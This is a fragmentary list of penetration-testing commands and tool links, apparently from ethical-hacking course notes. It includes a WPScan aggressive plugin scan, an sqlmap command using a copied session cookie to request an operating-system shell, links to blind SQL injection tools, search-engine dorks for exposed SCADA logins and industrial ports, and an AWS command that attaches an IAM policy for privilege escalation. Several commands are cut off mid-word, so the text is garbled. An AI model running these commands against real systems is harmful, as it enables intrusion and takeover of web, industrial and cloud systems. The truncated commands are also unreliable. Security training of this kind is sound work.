...
- ` wpscan --api-token [API Token from Step#26] --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate vp`
...
- `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" --os-shel`
- [Mole](https://sourceforge.net)
- [Blisqy](https://github.com/JohnTroony/Blisqy)
- [blind-sql-bitshifting](https://github.com/awnumar/blind-sql-bitshifting)
...
- [Quick Android Review Kit(QARK)](https://github.com/linkedin/qark)
...
- "login" intitle:"scada login(google)
- port:1883,port:502(shodan)
...
- ```
  ...
  aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:p olicy/user-polic
